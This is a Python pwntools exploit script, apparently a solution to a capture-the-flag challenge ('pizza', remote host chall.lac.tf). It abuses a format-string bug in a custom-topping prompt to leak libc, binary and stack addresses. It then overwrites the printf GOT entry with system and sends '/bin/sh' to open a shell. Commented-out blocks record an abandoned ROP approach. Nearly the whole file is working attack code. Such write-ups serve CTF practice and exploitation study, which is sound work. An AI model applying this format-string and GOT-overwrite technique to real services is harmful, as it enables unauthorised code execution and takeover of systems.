from pwn import *

import time

exe = ELF('./pizza_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

# b *main+529
io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main+529
        b *main+634
        continue
    """)
elif args.REMOTE:
    io = remote("chall.lac.tf", "31134")

def send_custom_topping(custom_topping):
    io.sendlineafter(b'>', b'12')
    io.sendlineafter(b':', custom_topping)

# ********************************************
# libc leak
# ********************************************

# libc
send_custom_topping(b'%67$p')
# main
send_custom_topping(b'%49$p')
# rbp
send_custom_topping(b'%51$p')

io.recvline()
libc_start_main = int(io.recvline(), 16) - 133
main_address = int(io.recvline(), 16)
rbp_address = int(io.recvline(), 16) - 280

libc.address = libc_start_main - libc.symbols.__libc_start_main
exe.address = main_address - exe.symbols.main
print(f'{hex(libc.symbols.system) = }')
print(f'{hex(main_address) = }')
print(f'{hex(rbp_address) = }')
print(f'{hex(exe.got.printf) = }')
print(f'{hex(exe.got.puts) = }')

io.sendlineafter(b'(y/n):', b'y')

# # ********************************************
# # ROP
# # ********************************************
# ret_addr = exe.address + 0x1016
# print(f'{hex(ret_addr) = }')
# writes = {rbp_address + 8: ret_addr}
# offset = 6
# payload = fmtstr_payload(offset, writes, write_size='short')
# print(len(payload))
# send_custom_topping(payload)
# send_custom_topping(b'/bin/sh')
# send_custom_topping(b'X')
# io.sendlineafter(b'(y/n):', b'y')

# writes = {rbp_address + 8: libc.symbols.scanf}
# offset = 6
# payload = fmtstr_payload(offset, writes, write_size='short')
# print(len(payload))
# send_custom_topping(payload)
# send_custom_topping(b'/bin/sh')
# send_custom_topping(b'X')
# io.sendlineafter(b'(y/n):', b'y')

# writes = {rbp_address + 16: libc.symbols.system}
# offset = 6
# payload = fmtstr_payload(offset, writes, write_size='short')
# print(len(payload))
# send_custom_topping(payload)
# send_custom_topping(b'/bin/sh')
# send_custom_topping(b'X')
# io.sendlineafter(b'(y/n):', b'n')

# # rdi_addr = rbp_address - 1664
# # writes = {rdi_addr: b'/bin/sh\x00'}
# # offset = 6
# # payload = fmtstr_payload(offset, writes, write_size='short')
# # print(len(payload))
# # send_custom_topping(payload)
# # send_custom_topping(b'/bin/sh')
# # send_custom_topping(b'X')
# # io.sendlineafter(b'(y/n):', b'n')


# ********************************************
# got overwrite
# ********************************************

# print(hex(libc.symbols.system & 0xffffffff))
writes = {exe.got.printf: libc.symbols.system}
# writes = {exe.got.printf: libc_start_main}
offset = 6
payload = fmtstr_payload(offset, writes, write_size='short')
print(len(payload))
send_custom_topping(payload)
send_custom_topping(b'/bin/sh')
send_custom_topping(b'X')


print(len(io.recvline()))
print(len(io.recvline()))
# print(len(io.recvline(timeout=40)))

io.interactive()
